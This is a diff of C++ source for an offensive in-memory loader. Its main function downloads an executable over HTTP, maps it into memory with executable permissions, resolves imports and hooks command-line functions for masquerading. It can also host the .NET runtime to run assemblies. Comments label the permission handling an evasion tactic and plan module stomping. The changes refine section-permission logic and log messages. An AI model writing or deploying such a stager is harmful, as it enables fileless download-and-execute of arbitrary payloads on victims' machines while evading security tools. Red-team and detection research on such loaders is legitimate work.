@@ -17,6 +17,7 @@
 		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
 // TODO: Module Stomping 
+// TODO: can't seem to set load native memory to RW without voilation, possibly because memory is too close together and not on seperate pages?
 // TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: parse headers and allocate straight from HTTP download 
 // TODO: find argv/argc get functions for other native C++ compilers, 
@@ -87,7 +88,7 @@ char* httpStage(LPCSTR urlStr,size_t &out_size) {
 	if (!HttpSendRequestA(hHttpFile, NULL, 0, 0, 0)) {
 		char err[256];
 		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, (sizeof(err) / sizeof(wchar_t)), NULL);
-		printf("[!] HTTP request failed %s", err);
+		printf("[!] HTTP request failed %s\n", err);
 		return NULL;
 	}
 
@@ -459,7 +460,7 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	// NtUnmapViewOfSection does not have a corresponding user-mode function
 	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
-	// try to alloc memory for image at preferred address (should this be changed to RW initially?)
+	// try to alloc memory for image at preferred address 
 	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 	// if allocation not possible at preferred address, allocate anywhere
@@ -471,10 +472,15 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 		return 1;
 	}
 
-	// copy image header to allocated memory
+	// copy image NT header to allocated memory
 	memcpy(peImageBase, peBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
-	// copy image sections(.text, .data, .bss, ect) to allocated memory
+	// NT headers are read only
+	DWORD oldProtect;
+	VirtualProtect(peImageBase, ntHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect);
+
+	// find section headers address (starts after NT headers)
 	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
+	// copy image sections(.text, .data, .bss, ect) to allocated memory
 	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
 		LPVOID sectionVA = LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress);
 		LPVOID sectionBuffer = LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData);
@@ -489,35 +495,54 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 		);
 
 		// change sections permissions(PAGE_EXECUTE_READWRITE) to specific permission (evasion tactic)
-		DWORD ulPermissions = PAGE_EXECUTE_READWRITE;
-		ULONG_PTR sectionVirtualSize = sectionHeader->Misc.VirtualSize;
-		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
-			ulPermissions = PAGE_WRITECOPY;
+		// Characteristics can be one or a combination of: IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE
+		DWORD ulPermissions = 0;
+		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		{
+			if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
+			{
+				if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+					ulPermissions = PAGE_EXECUTE_READWRITE;
+				} else {
+					ulPermissions = PAGE_EXECUTE_READ;
+				}
+			} else {
+				if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+					ulPermissions = PAGE_EXECUTE_WRITECOPY;
+				} else {
+					ulPermissions = PAGE_EXECUTE;
+				}
+			}
 		}
-		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ) {
-			ulPermissions = PAGE_READONLY;
+		else
+		{
+			if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
+			{
+				if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+					ulPermissions = PAGE_READWRITE;
+				} else {
+					ulPermissions = PAGE_READONLY;
+				}
+			} else {
+				if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+					ulPermissions = PAGE_WRITECOPY;
+				} else {
+					ulPermissions = PAGE_NOACCESS;
+				}
+			}
 		}
-		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
-			ulPermissions = PAGE_READWRITE;
-		}
-		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-			ulPermissions = PAGE_EXECUTE;
-		}
-		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
-			ulPermissions = PAGE_EXECUTE_WRITECOPY;
-		}
-		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
-			ulPermissions = PAGE_EXECUTE_READ;
-		}
-		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
-			ulPermissions = PAGE_EXECUTE_READWRITE;
+
+		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
+			ulPermissions |= PAGE_NOCACHE;
 		}
 
 		// debugging print
 		printf("setting permissions %08x -> %p\n", ulPermissions, sectionVA);
 		// set new permissions on memory
+		ULONG_PTR sectionVirtualSize = sectionHeader->Misc.VirtualSize;
 		VirtualProtect(sectionVA, sectionVirtualSize, ulPermissions, &ulPermissions);
 
+		printf("%08x\n",ulPermissions);
 	}
 
 	// reference headers from allocated memory so buffer can be free'd
@@ -534,14 +559,14 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	if (preferredAddr != peImageBase) {
 		// rebase image relative to newly allocated memory address
 		if (rebaseImage(peImageBase, ntHeader)) {
-			printf("[!] image cannot be rebased");
+			printf("[!] image cannot be rebased\n");
 			return 1;
 		}
 	}
 
 	// import libraries, add function addresses to IAT, and hook commandline functions for masqurading
 	if (resolveImportAddressTable(peImageBase, ntHeader, true)) {
-		printf("[!] imports cannot be resolved");
+		printf("[!] imports cannot be resolved\n");
 		return 1;
 	}
 
@@ -623,7 +648,7 @@ HRESULT loadCLR(ICorRuntimeHost** cLRHostPtr) {
 	}
 	else {
 		// debugging print
-		printf("[-] CLR 4.0+ not found on host, trying CLR 2.0");
+		printf("[-] CLR 4.0+ not found on host, trying CLR 2.0\n");
 
 		// create Common Language Runtime object from its CLSID in COM
 		res = CoCreateInstance(
@@ -756,7 +781,7 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 	if (FAILED(res)) {
 		_com_error err(res);
 		LPCTSTR errMsg = err.ErrorMessage();
-		wprintf(L"[!] Invoke_3 failed error message: %s", errMsg);
+		wprintf(L"[!] Invoke_3 failed error message: %s\n", errMsg);
 		return res;
 	}
 
@@ -877,7 +902,7 @@ int main(int argc, char* argv[])
 	size_t peSize;
 	char* peBuffer = httpStage(argv[1], peSize);
 	if (peBuffer == NULL) {
-		printf("[!] HTTP request failed");
+		printf("[!] HTTP request failed\n");
 		return 1;
 	}
 
